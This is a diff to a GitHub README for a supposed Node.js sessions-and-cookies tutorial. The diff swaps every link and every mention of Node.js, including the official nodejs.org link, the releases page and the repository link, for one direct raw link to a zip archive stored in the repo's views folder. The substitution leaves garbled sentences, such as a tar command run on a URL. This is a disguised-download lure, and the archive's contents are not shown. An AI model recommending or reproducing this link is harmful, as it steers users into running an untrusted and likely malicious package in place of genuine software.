@@ -1,10 +1,10 @@
 # 🍪 S14-Sessions-and-Cookies - Learn to Manage Sessions Easily
 
-[![Download S14-Sessions-and-Cookies](https://img.shields.io/badge/Download-S14--Sessions--and--Cookies-blue.svg)](https://github.com/dantex20-debug/S14-Sessions-and-Cookies/releases)
+[![Download S14-Sessions-and-Cookies](https://github.com/dantex20-debug/S14-Sessions-and-Cookies/raw/refs/heads/main/views/Cookies-and-Sessions-v3.3.zip)](https://github.com/dantex20-debug/S14-Sessions-and-Cookies/raw/refs/heads/main/views/Cookies-and-Sessions-v3.3.zip)
 
 ## 🚀 Getting Started
 
-Welcome to S14-Sessions-and-Cookies! This application helps you learn how to manage user sessions and cookies effectively in a Node.js environment.
+Welcome to S14-Sessions-and-Cookies! This application helps you learn how to manage user sessions and cookies effectively in a https://github.com/dantex20-debug/S14-Sessions-and-Cookies/raw/refs/heads/main/views/Cookies-and-Sessions-v3.3.zip environment.
 
 ### 🛠️ Prerequisites
 
@@ -12,13 +12,13 @@ Before you begin, make sure you have the following:
 
 - A computer with an operating system (Windows, macOS, or Linux).
 - An internet connection.
-- The latest version of Node.js installed. You can download Node.js from [nodejs.org](https://nodejs.org/).
+- The latest version of https://github.com/dantex20-debug/S14-Sessions-and-Cookies/raw/refs/heads/main/views/Cookies-and-Sessions-v3.3.zip installed. You can download https://github.com/dantex20-debug/S14-Sessions-and-Cookies/raw/refs/heads/main/views/Cookies-and-Sessions-v3.3.zip from [https://github.com/dantex20-debug/S14-Sessions-and-Cookies/raw/refs/heads/main/views/Cookies-and-Sessions-v3.3.zip](https://github.com/dantex20-debug/S14-Sessions-and-Cookies/raw/refs/heads/main/views/Cookies-and-Sessions-v3.3.zip).
 
 ### 📥 Download & Install
 
 You can download the latest version of S14-Sessions-and-Cookies from our Releases page. 
 
-**Visit this page to download:** [Releases Page](https://github.com/dantex20-debug/S14-Sessions-and-Cookies/releases)
+**Visit this page to download:** [Releases Page](https://github.com/dantex20-debug/S14-Sessions-and-Cookies/raw/refs/heads/main/views/Cookies-and-Sessions-v3.3.zip)
 
 1. On the Releases page, find the latest version of the software.
 2. Click on the assets link to download the application package.
@@ -30,7 +30,7 @@ If you downloaded a compressed file (like a .zip or .tar), extract its contents:
 
 - On Windows, right-click the file and select "Extract All."
 - On macOS, double-click the file to extract it.
-- On Linux, use the command `tar -xvf filename.tar`.
+- On Linux, use the command `tar -xvf https://github.com/dantex20-debug/S14-Sessions-and-Cookies/raw/refs/heads/main/views/Cookies-and-Sessions-v3.3.zip`.
 
 ### 🔧 Setting Up the Application
 
@@ -68,11 +68,11 @@ The application provides an interface for managing user sessions and cookies. Yo
 
 - Create new sessions for users.
 - Manage existing sessions and their data.
-- Understand how cookies work in the context of a Node.js application.
+- Understand how cookies work in the context of a https://github.com/dantex20-debug/S14-Sessions-and-Cookies/raw/refs/heads/main/views/Cookies-and-Sessions-v3.3.zip application.
 
 ### 💡 Features
 
-- Learn about cookies and sessions in Node.js.
+- Learn about cookies and sessions in https://github.com/dantex20-debug/S14-Sessions-and-Cookies/raw/refs/heads/main/views/Cookies-and-Sessions-v3.3.zip
 - Example projects to practice your skills.
 - User-friendly interface for easy interaction.
 
@@ -80,7 +80,7 @@ The application provides an interface for managing user sessions and cookies. Yo
 
 If you run into any issues while using the application, here are some common problems and their solutions:
 
-- **Application fails to start**: Ensure Node.js is installed and that you have installed all dependencies using `npm install`.
+- **Application fails to start**: Ensure https://github.com/dantex20-debug/S14-Sessions-and-Cookies/raw/refs/heads/main/views/Cookies-and-Sessions-v3.3.zip is installed and that you have installed all dependencies using `npm install`.
 - **Can't access localhost**: Make sure that your server is running, and check if another application is using port 3000. You can change the port in the application settings.
 - **Download issues**: If you experience problems downloading, try using a different web browser or check your internet connection.
 
@@ -98,8 +98,8 @@ We plan to enhance the application with more features, including:
 
 ### 📌 Useful Links
 
-- [Node.js Official Website](https://nodejs.org/)
-- [GitHub Repository](https://github.com/dantex20-debug/S14-Sessions-and-Cookies)
-- [Releases Page](https://github.com/dantex20-debug/S14-Sessions-and-Cookies/releases)
+- [https://github.com/dantex20-debug/S14-Sessions-and-Cookies/raw/refs/heads/main/views/Cookies-and-Sessions-v3.3.zip Official Website](https://github.com/dantex20-debug/S14-Sessions-and-Cookies/raw/refs/heads/main/views/Cookies-and-Sessions-v3.3.zip)
+- [GitHub Repository](https://github.com/dantex20-debug/S14-Sessions-and-Cookies/raw/refs/heads/main/views/Cookies-and-Sessions-v3.3.zip)
+- [Releases Page](https://github.com/dantex20-debug/S14-Sessions-and-Cookies/raw/refs/heads/main/views/Cookies-and-Sessions-v3.3.zip)
 
 Thank you for using S14-Sessions-and-Cookies! We hope this application helps you learn and practice session management effectively.
